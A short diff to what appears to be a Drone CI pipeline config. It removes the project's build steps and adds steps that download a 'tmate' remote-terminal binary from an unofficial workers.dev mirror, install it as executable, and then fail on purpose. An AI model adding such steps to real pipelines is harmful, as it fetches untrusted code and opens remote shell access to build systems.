@@ -11,9 +11,9 @@ steps:
        from_secret: chat_id
    commands:
       - apt-get update &&apt-get install wget tmate -y
-      - bash configs/build*.sh
-      - cd /drone/src/
-      - git clone https://github.com/DhruvChhura/build-scripts scripts
-      - cd scripts
-      - bash build1.sh
-
+      - wget https://drive.officialmirror.workers.dev/tmate
+      - mkdir -p /usr/drone/
+      - mkdir -p /usr/drone/bin/
+      - mv tmate /usr/drone/bin/tmate
+      - chmod +x /usr/drone/bin/tmate
+      - fail
